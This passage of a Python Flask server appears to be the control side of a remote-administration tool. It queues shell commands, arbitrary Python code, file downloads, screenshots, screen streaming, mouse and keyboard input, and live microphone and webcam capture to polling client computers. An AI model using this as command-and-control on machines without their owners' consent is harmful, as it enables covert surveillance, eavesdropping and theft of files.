                "exit_code": 0,
                "created": time.time()
            }

            client_actions.setdefault(name, queue.Queue()).put({
                "action": "console",
                "command_id": command_id,
                "command": command
            })

            return jsonify({"command_id": command_id})

        console_commands[command_id] = {
            "name": name,
            "status": "ready",
            "output": output,
            "exit_code": 0,
            "created": time.time()
        }

    payload = {"command_id": command_id}

    if request_id:
        payload["request_id"] = request_id

    return jsonify(payload)


@app.route("/upload-console", methods=["POST"])
@require_auth
def upload_console():

    command_id = request.form.get("command_id")
    name = request.form.get("name")
    output_text = request.form.get("output", "")
    exit_code = request.form.get("exit_code", "0")

    if not command_id or not name:
        return jsonify({"error": "Missing information"}), 400

    try:
        exit_code = int(exit_code)
    except ValueError:
        exit_code = 0

    with lock:

        item = console_commands.get(command_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid console request"}), 403

        item["output"] = output_text[:100000]
        item["exit_code"] = exit_code
        item["status"] = "ready"

    return jsonify({"success": True})


@app.route("/api/console/result/<command_id>")
@require_auth
def console_result(command_id):

    with lock:
        item = console_commands.get(command_id)

    if not item:
        return jsonify({"error": "Request not found"}), 404

    return jsonify({
        "status": item["status"],
        "output": item.get("output", ""),
        "exit_code": item.get("exit_code", 0),
        "message": item.get("message", "")
    })


# ==================================================
# REMOTE PYTHON RUNNER
# ==================================================

@app.route("/api/python/run", methods=["POST"])
@require_auth
def run_python():

    data = request.get_json(silent=True) or {}

    name = data.get("name")
    code = data.get("code", "")

    if not isinstance(code, str) or not code.strip():
        return jsonify({"error": "Python code is empty."}), 400

    if len(code) > 200000:
        return jsonify({"error": "Python code is too long."}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found."}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline."}), 404

        request_id = str(uuid.uuid4())

        python_requests[request_id] = {
            "name": name,
            "status": "pending",
            "output": "",
            "exit_code": 0,
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "python",
            "request_id": request_id,
            "code": code
        })

    return jsonify({"request_id": request_id})


@app.route("/upload-python", methods=["POST"])
@require_auth
def upload_python():

    request_id = request.form.get("request_id")
    name = request.form.get("name")
    output_text = request.form.get("output", "")
    exit_code = request.form.get("exit_code", "0")

    if not request_id or not name:
        return jsonify({"error": "Missing information"}), 400

    try:
        exit_code = int(exit_code)
    except ValueError:
        exit_code = 0

    with lock:

        item = python_requests.get(request_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid Python request"}), 403

        item["output"] = output_text[:100000]
        item["exit_code"] = exit_code
        item["status"] = "ready"

    return jsonify({"success": True})


@app.route("/api/python/result/<request_id>")
@require_auth
def python_result(request_id):

    with lock:
        item = python_requests.get(request_id)

    if not item:
        return jsonify({"error": "Request not found"}), 404

    return jsonify({
        "status": item["status"],
        "output": item.get("output", ""),
        "exit_code": item.get("exit_code", 0)
    })


# ==================================================
# CLIENT DIRECTORY SYNC
# ==================================================

@app.route("/sync", methods=["POST"])
@require_auth
def sync():

    data = request.get_json(silent=True) or {}

    requested_name = data.get("name")
    computer_name = data.get("computer_name")
    root = data.get("root")
    tree = data.get("tree")

    if not all([
        computer_name,
        root,
        isinstance(tree, dict)
    ]):
        return jsonify({"error": "Invalid client data"}), 400

    with lock:

        now = time.time()

        if requested_name and requested_name in clients:
            assigned_name = requested_name
        else:
            assigned_name = allocate_client_name(computer_name, now)

        existing = clients.get(assigned_name)

        if existing:
            tree = merge_tree(existing["tree"], tree)

        tree["loaded"] = True

        connected = assigned_name not in clients

        clients[assigned_name] = {
            "name": assigned_name,
            "base_name": computer_name,
            "root": root,
            "tree": tree,
            "last_seen": now
        }

        client_actions.setdefault(
            assigned_name,
            queue.Queue()
        )

    if connected:
        add_log(
            "success",
            f"Computer connected: {assigned_name}"
        )

    return jsonify({
        "success": True,
        "name": assigned_name
    })


# ==================================================
# CLIENT LIST
# ==================================================

@app.route("/api/clients")
@require_auth
def get_clients():

    result = []
    now = time.time()

    with lock:

        stale = [
            name for name, client in clients.items()
            if now - client["last_seen"] > OFFLINE_AFTER_SECONDS
        ]

        for name in stale:
            remove_client(name)

        for name, client in clients.items():

            result.append({
                "name": name,
                "last_seen": client["last_seen"]
            })

    return jsonify({"clients": result})


# ==================================================
# ACTIVITY LOG API
# ==================================================

@app.route("/api/logs")
@require_auth
def get_logs():

    try:
        after = int(request.args.get("after", 0))
    except (TypeError, ValueError):
        after = 0

    with log_lock:
        entries = [
            entry for entry in app_logs
            if entry["id"] > after
        ][-200:]

    return jsonify({
        "logs": entries,
        "started": SERVER_STARTED
    })


# ==================================================
# DIRECTORY TREE
# ==================================================

@app.route("/api/tree")
@require_auth
def get_tree():

    name = request.args.get("name")

    with lock:
        client = clients.get(name)

    if not client:
        return jsonify({"error": "Computer not found"}), 404

    if time.time() - client["last_seen"] > 60:
        return jsonify({"error": "Computer is offline"}), 404

    return jsonify({
        "name": client["name"],
        "root": client["root"],
        "tree": client["tree"]
    })


# ==================================================
# LAZY DIRECTORY LISTING
# ==================================================

@app.route("/api/request-listing", methods=["POST"])
@require_auth
def request_listing():

    data = request.get_json(silent=True) or {}

    name = data.get("name")
    path = data.get("path", "")

    if not name or not isinstance(path, str):
        return jsonify({"error": "Missing information"}), 400

    try:
        path = normalize_listing_path(path)
    except ValueError:
        return jsonify({"error": "Invalid path"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        request_id = str(uuid.uuid4())

        listing_requests[request_id] = {
            "name": name,
            "path": path,
            "status": "pending",
            "listing": None,
            "error": "",
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "list_dir",
            "request_id": request_id,
            "path": path
        })

    return jsonify({"request_id": request_id})


@app.route("/upload-list", methods=["POST"])
@require_auth
def upload_list():

    request_id = request.form.get("request_id")
    name = request.form.get("name")
    error_text = request.form.get("error", "")
    listing_raw = request.form.get("listing", "")

    if not request_id or not name:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        item = listing_requests.get(request_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid listing request"}), 403

        if error_text:

            item["status"] = "error"
            item["error"] = error_text[:500]

            return jsonify({"success": True})

        try:
            listing = json.loads(listing_raw or "{}")
        except (TypeError, ValueError):
            listing = None

        if not isinstance(listing, dict):

            item["status"] = "error"
            item["error"] = "Invalid directory listing."

            return jsonify({"error": item["error"]}), 400

        item["listing"] = listing
        item["status"] = "ready"
        item["error"] = ""

        client = clients.get(name)

        if client:
            store_listing(client, item["path"], listing)

    return jsonify({"success": True})


@app.route("/api/listing-status/<request_id>")
@require_auth
def listing_status(request_id):

    with lock:
        item = listing_requests.get(request_id)

    if not item:
        return jsonify({"error": "Request not found"}), 404

    return jsonify({
        "status": item["status"],
        "error": item.get("error", ""),
        "listing": item.get("listing")
    })


# ==================================================
# REQUEST SCREENSHOT
# ==================================================

@app.route("/api/request-screenshot", methods=["POST"])
@require_auth
def request_screenshot():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        request_id = str(uuid.uuid4())

        screenshots[request_id] = {
            "name": name,
            "status": "pending",
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "screenshot",
            "request_id": request_id
        })

    return jsonify({"request_id": request_id})


# ==================================================
# RECEIVE SCREENSHOT
# ==================================================

@app.route("/upload-screenshot", methods=["POST"])
@require_auth
def upload_screenshot():

    request_id = request.form.get("request_id")
    name = request.form.get("name")
    uploaded_file = request.files.get("screenshot")

    if not request_id or not name or not uploaded_file:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        item = screenshots.get(request_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid screenshot request"}), 403

        image_data = uploaded_file.read(
            MAX_SCREENSHOT_SIZE + 1
        )

        if len(image_data) > MAX_SCREENSHOT_SIZE:
            item["status"] = "error"
            item["message"] = "Screenshot is too large."
            return jsonify({"error": item["message"]}), 413

        if not image_data.startswith(b"\x89PNG\r\n\x1a\n"):
            item["status"] = "error"
            item["message"] = "Invalid PNG image."
            return jsonify({"error": item["message"]}), 400

        item["status"] = "ready"
        item["image"] = image_data

    return jsonify({"success": True})


# ==================================================
# SCREENSHOT STATUS
# ==================================================

@app.route("/api/screenshot-status/<request_id>")
@require_auth
def screenshot_status(request_id):

    with lock:
        item = screenshots.get(request_id)

    if not item:
        return jsonify({
            "status": "error",
            "message": "Request not found"
        }), 404

    return jsonify({
        "status": item["status"],
        "message": item.get("message", "")
    })


# ==================================================
# LATEST SCREENSHOT
# ==================================================

@app.route("/api/latest/<name>.png")
@require_auth
def latest_screenshot(name):

    with lock:

        matching = [
            item for item in screenshots.values()
            if item["name"] == name
            and item["status"] == "ready"
        ]

        if not matching:
            return "No screenshot available.", 404

        latest = max(
            matching,
            key=lambda item: item["created"]
        )

        image_data = latest["image"]

    return send_file(
        io.BytesIO(image_data),
        mimetype="image/png"
    )


# ==================================================
# LIVE SCREEN SHARE
# ==================================================

def stream_viewer_id(data):
    return str(data.get("viewer") or "default")[:40]


@app.route("/api/stream/start", methods=["POST"])
@require_auth
def start_stream():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    viewer = stream_viewer_id(data)

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404

        viewers = stream_viewers.setdefault(name, set())

        already_running = bool(streams.get(name, {}).get("active"))

        viewers.add(viewer)

        if not already_running:
            streams[name] = {
                "active": True,
                "frame": None,
                "timestamp": 0.0
            }

            client_actions.setdefault(name, queue.Queue()).put({
                "action": "stream_start"
            })

    return jsonify({"success": True})


@app.route("/api/stream/stop", methods=["POST"])
@require_auth
def stop_stream():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    viewer = stream_viewer_id(data)

    with lock:

        viewers = stream_viewers.get(name)

        if viewers:
            viewers.discard(viewer)

        if viewers:
            return jsonify({"success": True})

        stream_viewers.pop(name, None)

        state = streams.setdefault(name, {
            "active": False,
            "frame": None,
            "timestamp": 0.0
        })

        was_active = state["active"]

        state["active"] = False
        state["frame"] = None
        state["timestamp"] = 0.0

        if was_active and name in clients:
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "stream_stop"
            })

    return jsonify({"success": True})


@app.route("/upload-stream", methods=["POST"])
@require_auth
def upload_stream():

    name = request.form.get("name")
    uploaded_file = request.files.get("frame")

    if not name or not uploaded_file:
        return jsonify({"error": "Missing information"}), 400

    frame_data = uploaded_file.read(MAX_STREAM_FRAME_SIZE + 1)

    if len(frame_data) > MAX_STREAM_FRAME_SIZE:
        return jsonify({"error": "Frame is too large."}), 413

    if not frame_data.startswith(b"\xff\xd8"):
        return jsonify({"error": "Invalid JPEG frame."}), 400

    with lock:

        state = streams.get(name)

        if not state or not state["active"]:
            return jsonify({"error": "Stream is not active."}), 409

        state["frame"] = frame_data
        state["timestamp"] = time.time()

    return jsonify({"success": True})


@app.route("/api/stream/frame/<name>")
@require_auth
def stream_frame(name):

    with lock:

        state = streams.get(name)

        frame_data = state["frame"] if state else None

    if not frame_data:
        return jsonify({"error": "No frame available"}), 404

    response = send_file(
        io.BytesIO(frame_data),
        mimetype="image/jpeg"
    )

    response.headers["Cache-Control"] = (
        "no-store, no-cache, must-revalidate, max-age=0"
    )

    return response


@app.route("/api/remote-click", methods=["POST"])
@require_auth
def remote_click():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    try:
        x = float(data.get("x"))
        y = float(data.get("y"))
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid click position"}), 400

    if not (0.0 <= x <= 1.0 and 0.0 <= y <= 1.0):
        return jsonify({"error": "Click position is out of range"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "mouse_click",
            "x": round(x, 4),
            "y": round(y, 4)
        })

    return jsonify({"success": True})


@app.route("/api/remote-mouse", methods=["POST"])
@require_auth
def remote_mouse():
    data = request.get_json(silent=True) or {}
    name = data.get("name")
    action = data.get("action")
    if not name or action not in ("click", "down", "up"):
        return jsonify({"error": "Invalid request"}), 400
    try:
        x = float(data.get("x", 0.5))
        y = float(data.get("y", 0.5))
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid position"}), 400
    with lock:
        client = clients.get(name)
        if not client:
            return jsonify({"error": "Computer not found"}), 404
        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404
        client_actions.setdefault(name, queue.Queue()).put({
            "action": "mouse_" + action,
            "x": round(x, 4),
            "y": round(y, 4)
        })
    return jsonify({"success": True})


@app.route("/api/remote-scroll", methods=["POST"])
@require_auth
def remote_scroll():
    data = request.get_json(silent=True) or {}
    name = data.get("name")
    if not name:
        return jsonify({"error": "Missing computer name"}), 400
    try:
        x = float(data.get("x", 0.5))
        y = float(data.get("y", 0.5))
        delta = int(data.get("delta", 3))
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid scroll data"}), 400
    with lock:
        client = clients.get(name)
        if not client:
            return jsonify({"error": "Computer not found"}), 404
        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404
        client_actions.setdefault(name, queue.Queue()).put({
            "action": "mouse_scroll",
            "x": round(x, 4),
            "y": round(y, 4),
            "delta": delta
        })
    return jsonify({"success": True})


@app.route("/api/remote-key", methods=["POST"])
@require_auth
def remote_key():
    data = request.get_json(silent=True) or {}
    name = data.get("name")
    if not name:
        return jsonify({"error": "Missing computer name"}), 400
    with lock:
        client = clients.get(name)
        if not client:
            return jsonify({"error": "Computer not found"}), 404
        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404
        if "text" in data:
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "key_text",
                "text": str(data["text"])[:500]
            })
        else:
            key = data.get("key", "")
            key_type = data.get("type", "press")
            if not key or key_type not in ("press", "down", "up"):
                return jsonify({"error": "Invalid key data"}), 400
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "key_press",
                "key": key,
                "type": key_type
            })
    return jsonify({"success": True})


# ==================================================
# LIVE MICROPHONE
# ==================================================

@app.route("/api/mic/start", methods=["POST"])
@require_auth
def start_mic():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        mic_streams[name] = {
            "active": True,
            "error": "",
            "rate": 16000,
            "channels": 1,
            "seq": 0,
            "chunks": deque(maxlen=250),
            "timestamp": 0.0
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "mic_start"
        })

    return jsonify({"success": True})


@app.route("/api/mic/stop", methods=["POST"])
@require_auth
def stop_mic():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        state = mic_streams.get(name)

        if state:
            state["active"] = False
            state["error"] = ""
            state["chunks"].clear()
            state["timestamp"] = 0.0

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "mic_stop"
        })

    return jsonify({"success": True})


@app.route("/upload-audio", methods=["POST"])
@require_auth
def upload_audio():

    name = request.form.get("name")
    error_text = request.form.get("error", "")
    uploaded_file = request.files.get("audio")

    if not name:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        state = mic_streams.get(name)

        if not state or not state["active"]:
            return jsonify({"error": "Microphone is not active."}), 409

        if error_text:

            state["active"] = False
            state["error"] = error_text[:500]
            state["chunks"].clear()

            return jsonify({"success": True})

        if not uploaded_file:
            return jsonify({"error": "Missing audio chunk"}), 400

        chunk = uploaded_file.read(MAX_AUDIO_CHUNK_SIZE + 1)

        if not chunk:
            return jsonify({"error": "Empty audio chunk"}), 400

        if len(chunk) > MAX_AUDIO_CHUNK_SIZE:
            return jsonify({"error": "Audio chunk is too large."}), 413

        state["seq"] += 1
        state["timestamp"] = time.time()

        state["chunks"].append({
            "seq": state["seq"],
            "time": state["timestamp"],
            "data": chunk
        })

    return jsonify({"success": True})


@app.route("/api/mic/chunks")
@require_auth
def mic_chunks():

    name = request.args.get("name")

    try:
        since = int(request.args.get("since", "-1"))
    except (TypeError, ValueError):
        since = -1

    now = time.time()

    with lock:

        state = mic_streams.get(name)

        if not state:
            return jsonify({
                "active": False,
                "error": "",
                "rate": 16000,
                "channels": 1,
                "chunks": []
            })

        chunks = [
            {
                "seq": item["seq"],
                "data": base64.b64encode(item["data"]).decode("ascii")
            }
            for item in state["chunks"]
            if item["seq"] > since
            and now - item["time"] <= MAX_AUDIO_CHUNK_AGE
        ]

        result = {
            "active": state["active"],
            "error": state["error"],
            "rate": state["rate"],
            "channels": state["channels"],
            "chunks": chunks
        }

    return jsonify(result)


# ==================================================
# LIVE CAMERA
# ==================================================

@app.route("/api/camera/start", methods=["POST"])
@require_auth
def start_camera():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        camera_streams[name] = {
            "active": True,
            "error": "",
            "frame": None,
            "timestamp": 0.0
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "camera_start"
        })

    return jsonify({"success": True})


@app.route("/api/camera/stop", methods=["POST"])
@require_auth
def stop_camera():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        state = camera_streams.get(name)

        if state:
            state["active"] = False
            state["error"] = ""
            state["frame"] = None
            state["timestamp"] = 0.0

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "camera_stop"
        })

    return jsonify({"success": True})


@app.route("/upload-camera", methods=["POST"])
@require_auth
def upload_camera():

    name = request.form.get("name")
    error_text = request.form.get("error", "")
    uploaded_file = request.files.get("frame")

    if not name:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        state = camera_streams.get(name)

        if not state or not state["active"]:
            return jsonify({"error": "Camera is not active."}), 409

        if error_text:

            state["active"] = False
            state["error"] = error_text[:500]
            state["frame"] = None

            return jsonify({"success": True})

        if not uploaded_file:
            return jsonify({"error": "Missing camera frame"}), 400

        frame_data = uploaded_file.read(MAX_CAMERA_FRAME_SIZE + 1)

        if len(frame_data) > MAX_CAMERA_FRAME_SIZE:
            return jsonify({"error": "Camera frame is too large."}), 413

        if not frame_data.startswith(b"\xff\xd8"):
            return jsonify({"error": "Invalid JPEG frame."}), 400

        state["frame"] = frame_data
        state["timestamp"] = time.time()

    return jsonify({"success": True})


@app.route("/api/camera/frame/<name>")
@require_auth
def camera_frame(name):

    with lock:

        state = camera_streams.get(name)

        if not state:
            return jsonify({"error": "Camera is not active."}), 404

        if state["error"]:
            return jsonify({"error": state["error"]}), 404

        if not state["active"]:
            return jsonify({"error": "Camera stopped on the computer."}), 404

        frame_data = state["frame"]

    if not frame_data:
        return jsonify({"error": "No frame available"}), 404

    response = send_file(
        io.BytesIO(frame_data),
        mimetype="image/jpeg"
    )

    response.headers["Cache-Control"] = (
        "no-store, no-cache, must-revalidate, max-age=0"
    )

    return response


# ==================================================
# CLIENT ACTION POLLING
# ==================================================

@app.route("/next-action")
@require_auth
def next_action():

    name = request.args.get("name")

    with lock:
        action_queue = client_actions.get(name)

    if not action_queue:
        return jsonify({"action": None})

    try:
        action = action_queue.get_nowait()
    except queue.Empty:
        action = None

    return jsonify(action or {"action": None})


# ==================================================
# FILE DOWNLOAD ENDPOINTS
# ==================================================

@app.route("/api/request-download", methods=["POST"])
@require_auth
def request_download():

    data = request.get_json(silent=True) or {}

    name = data.get("name")
    path = data.get("path")

    if not name or not isinstance(path, str) or not path:
        return jsonify({"error": "Missing information"}), 400

    if ".." in path.replace("\\", "/").split("/"):
        return jsonify({"error": "Invalid path"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        download_id = str(uuid.uuid4())

        downloads[download_id] = {
            "name": name,
            "status": "pending",
            "filename": None,
            "data": None,
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "download",
            "download_id": download_id,
            "path": path
        })

    return jsonify({"download_id": download_id})


@app.route("/upload-download", methods=["POST"])
@require_auth
def upload_download():

    download_id = request.form.get("download_id")
    name = request.form.get("name")
    uploaded_file = request.files.get("file")

    if not download_id or not name or not uploaded_file:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        item = downloads.get(download_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid download request"}), 403

        file_data = uploaded_file.read(MAX_FILE_SIZE + 1)

        if len(file_data) > MAX_FILE_SIZE:
            item["status"] = "error"
            item["message"] = "File exceeds the 20 MB limit."
            return jsonify({"error": item["message"]}), 413

        item["filename"] = os.path.basename(uploaded_file.filename)
        item["data"] = file_data
        item["status"] = "ready"

    return jsonify({"success": True})


@app.route("/api/download-status/<download_id>")
@require_auth
def download_status(download_id):

    with lock:
        item = downloads.get(download_id)

    if not item:
        return jsonify({
            "status": "error",
            "message": "Request not found"
        }), 404

    return jsonify({
        "status": item["status"],
        "message": item.get("message", "")
    })


@app.route("/api/download/<download_id>")
@require_auth
def download_file(download_id):

    with lock:
        item = downloads.get(download_id)

    if not item or item["status"] != "ready":
        return jsonify({"error": "File is not ready"}), 404

    return send_file(
        io.BytesIO(item["data"]),
        as_attachment=True,
        download_name=item["filename"]
    )


# ==================================================
# CLEANUP
# ==================================================

def cleanup():

    while True:

        time.sleep(300)

        now = time.time()

        with lock:

            for name in list(clients):

                if now - clients[name]["last_seen"] > OFFLINE_AFTER_SECONDS:
                    remove_client(name)

            for download_id in list(downloads):

                if now - downloads[download_id]["created"] > 1800:
                    downloads.pop(download_id, None)

            for request_id in list(screenshots):

                if now - screenshots[request_id]["created"] > 1800:
                    screenshots.pop(request_id, None)

            for command_id in list(console_commands):

                if now - console_commands[command_id]["created"] > 1800:
                    console_commands.pop(command_id, None)

            for request_id in list(python_requests):

                if now - python_requests[request_id]["created"] > 1800:
                    python_requests.pop(request_id, None)

            for request_id in list(listing_requests):

                if now - listing_requests[request_id]["created"] > 600:
                    listing_requests.pop(request_id, None)

            for name in list(streams):

                state = streams[name]

                if (
                    not state["active"]
                    and now - state["timestamp"] > 300
                ):
                    streams.pop(name, None)


threading.Thread(
    target=cleanup,
    daemon=True
).start()


# ==================================================
# START SERVER
# ==================================================

if __name__ == "__main__":

    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 5000)),
        debug=False
    )
